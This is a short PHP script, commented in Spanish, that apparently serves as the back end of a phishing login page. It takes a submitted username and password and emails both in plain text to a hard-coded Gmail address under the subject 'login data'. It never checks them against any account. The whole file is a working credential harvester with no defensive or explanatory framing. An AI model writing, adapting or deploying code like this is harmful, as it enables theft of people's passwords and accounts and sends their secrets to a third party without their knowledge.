<?php
  if(isset($_POST['user'])) {
    $usuario = $_POST['user'];

    if (ctype_alnum($usuario)) {
      // Si el usuario es válido, procede con el envío del correo electrónico
      $contraseña = $_POST['passw'];
          
      // Destinatario del correo electrónico
      $destinatario = "lenzeka429.vic@gmail.com";
          
      // Asunto del correo electrónico
      $asunto = "Datos de inicio de sesión";
          
      // Construir el mensaje del correo electrónico
      $mensaje = "Usuario: " . $usuario . "\r\n";
      $mensaje .= "Contraseña: " . $contraseña . "\r\n";
          
      // Enviar el correo electrónico
      if (mail($destinatario, $asunto, $mensaje)) {
        echo "Correo electrónico enviado correctamente";
      } else {
        echo "Error al enviar el correo electrónico";
      }
      
    }else {
      echo "El usuario no es válido. Debe contener solo caracteres alfanuméricos.";
    }
  }
?>

